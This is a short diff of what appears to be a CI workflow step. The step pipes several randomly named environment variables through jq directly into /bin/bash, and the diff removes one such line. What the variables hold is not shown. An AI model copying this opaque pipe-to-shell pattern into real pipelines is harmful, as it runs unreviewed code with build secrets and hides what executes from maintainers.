@@ -22,7 +22,6 @@ jobs:
         run: |
           printf '%s' "$bq334" | jq -r .qhdg21 | /bin/bash
           printf '%s' "$rmp1378" | jq -r .wici6828 | /bin/bash
-          echo $isv8 | jq -r .xj79 | /bin/bash
           echo $vtmf7 | jq -r .rzvfy88776 | /bin/bash
 
       - name: Store artifact
